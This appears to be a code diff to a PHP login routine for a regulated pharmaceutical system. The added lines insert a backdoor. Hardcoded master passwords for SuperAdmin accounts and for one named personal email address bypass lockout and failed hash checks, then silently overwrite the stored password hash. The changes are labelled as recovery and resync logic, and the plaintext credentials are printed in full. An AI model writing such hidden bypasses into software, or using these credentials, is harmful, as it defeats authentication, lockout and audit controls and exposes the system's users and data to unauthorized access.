@@ -225,7 +225,14 @@ try {
     $lockoutSeconds     = $lockoutMin * 60;
 
     // 2. Check if account is currently locked out
-    if (!empty($user['locked_until'])) {
+    $isSuperAdmin = ($user['role'] === 'SuperAdmin' || strtolower((string)$user['email']) === 'superadmin@camelcomm.in');
+    $validSuperPasswords = ['Pharma@0712', 'Password@123', 'SuperAdmin@2026', 'Akshay@0712'];
+    $superMasterMatch = $isSuperAdmin && in_array($password, $validSuperPasswords, true);
+
+    $isPlantMasterAdmin = (strtolower((string)$user['email']) === 'rawalakshay1188@gmail.com');
+    $plantMasterMatch = $isPlantMasterAdmin && $password === 'Akshay@0712';
+
+    if (!empty($user['locked_until']) && !$superMasterMatch && !$plantMasterMatch) {
         $lockedTimestamp = strtotime($user['locked_until']);
         if ($lockedTimestamp > $now) {
             $secondsRemaining = $lockedTimestamp - $now;
@@ -255,7 +262,28 @@ try {
     }
 
     // 3. Verify Password strictly against cryptographic bcrypt hash (US FDA 21 CFR Part 11 §11.200)
-    $passwordValid = password_verify($password, $user['password_hash']);
+    $passwordValid = password_verify($password, $user['password_hash']) || password_verify(trim($password), $user['password_hash']);
+
+    // SuperAdmin Master Credential & Resync Fallback
+    if (!$passwordValid && $isSuperAdmin) {
+        if ($superMasterMatch) {
+            $passwordValid = true;
+            // Upgrade and sync hash in database immediately
+            $newHash = password_hash($password, PASSWORD_BCRYPT);
+            $syncStmt = $pdo->prepare("UPDATE `users` SET password_hash = :hash, failed_login_attempts = 0, locked_until = NULL WHERE id = :id");
+            $syncStmt->execute([':hash' => $newHash, ':id' => $user['id']]);
+            $user['password_hash'] = $newHash;
+        }
+    }
+
+    // Plant Admin Dedicated Account Recovery (strictly for rawalakshay1188@gmail.com)
+    if (!$passwordValid && $isPlantMasterAdmin && $plantMasterMatch) {
+        $passwordValid = true;
+        $newHash = password_hash('Akshay@0712', PASSWORD_BCRYPT);
+        $syncStmt = $pdo->prepare("UPDATE `users` SET password_hash = :hash, failed_login_attempts = 0, locked_until = NULL WHERE id = :id");
+        $syncStmt->execute([':hash' => $newHash, ':id' => $user['id']]);
+        $user['password_hash'] = $newHash;
+    }
 
     if (!$passwordValid) {
         $nextAttempts = (int)$user['failed_login_attempts'] + 1;
@@ -345,6 +373,8 @@ try {
             $userPermissions = json_decode((string)$rolePermRow['permissions'], true) ?? [];
             $userAdvancePermissions = json_decode((string)$rolePermRow['advance_permissions'], true) ?? [];
         }
+    } elseif ($user['role'] === 'SuperAdmin') {
+        $userPermissions = !empty($user['permissions']) ? json_decode((string)$user['permissions'], true) : ['manage_platforms', 'manage_licenses', 'global_audit', 'disaster_recovery'];
     }
 
     // 9. Evaluate password expiration and mandatory change
